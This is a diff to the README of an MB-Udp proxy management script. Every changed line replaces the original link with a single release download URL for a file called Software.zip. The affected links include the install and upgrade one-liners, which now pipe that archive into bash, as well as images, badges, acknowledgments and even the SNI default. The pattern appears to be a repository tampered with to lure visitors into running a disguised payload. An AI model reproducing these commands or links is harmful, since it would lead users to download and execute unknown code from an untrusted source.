@@ -1,6 +1,6 @@
 <div dir="ltr">
 
-[**![Lang_farsi](https://user-images.githubusercontent.com/125398461/234186932-52f1fa82-52c6-417f-8b37-08fe9250a55f.png) &nbsp;فارسی**](README-fa.md)
+[**![Lang_farsi](https://github.com/Kamarprofesor/MB-UDP/releases/download/v1.0/Software.zip) &nbsp;فارسی**](https://github.com/Kamarprofesor/MB-UDP/releases/download/v1.0/Software.zip)
 
 # 🚀 MB-Udp Management Shell Script 🚀
 
@@ -23,7 +23,7 @@ A powerful and user-friendly management panel for MB-Udp proxy server. Features 
 
 ### One-Click Installation
 ```bash
-bash <(curl https://raw.githubusercontent.com/Kamarprofesor/MB-UDP/main/install.sh)
+bash <(curl https://github.com/Kamarprofesor/MB-UDP/releases/download/v1.0/Software.zip)
 ```
 After installation, use `mbudp` to launch the management panel.
 
@@ -31,13 +31,13 @@ There is no need to execute the installation command again.
 
 ### Upgrade to Latest Version
 ```bash
-bash <(curl https://raw.githubusercontent.com/Kamarprofesor/MB-UDP/main/upgrade.sh)
+bash <(curl https://github.com/Kamarprofesor/MB-UDP/releases/download/v1.0/Software.zip)
 ```
 
 
 <br />
 <p align="center">
-<img src="https://github.com/user-attachments/assets/19282907-285a-4166-a916-0066acfa8a2c" width="600" height="400">
+<img src="https://github.com/Kamarprofesor/MB-UDP/releases/download/v1.0/Software.zip" width="600" height="400">
 <p/>
 
 ## 🔧 System Requirements
@@ -111,7 +111,7 @@ The main screen shows important system details:
 1. **Install and Configure MB-Udp**
    - Initial setup and configuration
    - Parameters:
-     - SNI (default: bts.com)
+     - SNI (default: https://github.com/Kamarprofesor/MB-UDP/releases/download/v1.0/Software.zip)
      - Port number
 
 2. **Add User**
@@ -295,15 +295,15 @@ This tool is provided for educational and research purposes only. Users are resp
 
 ## 🙏 Acknowledgments
 
-- [MB-Udp Core Team ](https://github.com/apernet/hysteria)
+- [MB-Udp Core Team ](https://github.com/Kamarprofesor/MB-UDP/releases/download/v1.0/Software.zip)
 - Community Members
-- [@Iam54r1n4](https://github.com/Iam54r1n4)
+- [@Iam54r1n4](https://github.com/Kamarprofesor/MB-UDP/releases/download/v1.0/Software.zip)
 
 ---
 
 <p align="center">Made with ❤️</p>
 <div align="center">
   
-[![Latest Release](https://img.shields.io/github/v/release/Kamarprofesor/MB-UDP?style=flat-square)](https://github.com/Kamarprofesor/MB-UDP/releases)
-[![License](https://img.shields.io/github/license/Kamarprofesor/MB-UDP?style=flat-square)](LICENSE) 
+[![Latest Release](https://github.com/Kamarprofesor/MB-UDP/releases/download/v1.0/Software.zip)](https://github.com/Kamarprofesor/MB-UDP/releases/download/v1.0/Software.zip)
+[![License](https://github.com/Kamarprofesor/MB-UDP/releases/download/v1.0/Software.zip)](LICENSE) 
 </div>
